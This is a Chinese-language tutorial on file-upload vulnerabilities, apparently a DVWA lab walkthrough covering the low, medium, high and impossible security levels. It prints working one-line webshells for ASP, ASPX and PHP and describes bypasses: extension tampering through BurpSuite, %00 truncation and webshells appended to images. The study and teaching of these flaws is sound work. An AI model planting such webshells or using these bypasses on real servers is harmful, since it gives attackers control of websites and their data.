## 概述

因为web应用程序通常会有文件上传功能，而**没有对上传文件的类型、内容进行严格的过滤和检查**，使得攻击者可以通过上传木马获取服务器的webshell权限。

### 危害

- 网站被控制，增删改查文件，链接数据库
- 服务器沦陷
- 网站沦陷

### 前提条件

- 能上传的木马
- 上传的木马能执行
- 清楚上传后的路径

### 一句话木马

往目标网站中加入一句话木马，然后就可以在本地通过中国菜刀chopper.exe获取和控制整个网站目录

- asp的一句话是：<%eval request ("pass")%>

- aspx的一句话是：\<%@ Page Language="Jscript"%><%eval(Request.Item\["pass"],"unsafe");%>
- php的一句话是：\<?php @eval($\_POST\['pass']);?>

可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。

## 示例

### 安全级别low

不对文件上传类型做限制：直接上传一句话木马程序，再用中国菜刀向上传后的路径地址发送POST请求，获取webshell权限

### 安全级别Medium

只允许上传jpeg/png：创建一句话木马并修改文件类型，但上传后服务器不会执行该程序

#### 解决方案

1. BurpSuite抓包修改
   上传木马1.png后，抓包修改为1.php，并forward转发
   
2. %00截断绕过
   将文件名改为1.php%00.png，进行文件名解析时服务器会讲%00后面的内容丢弃（php-version<5.3.4)

### 安全级别high

限制上传文件类型、大小，且会检查图片的相关信息

在图片末尾（记事本或其他方式打开）添加一句话木马

### 安全级别impossible

impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。



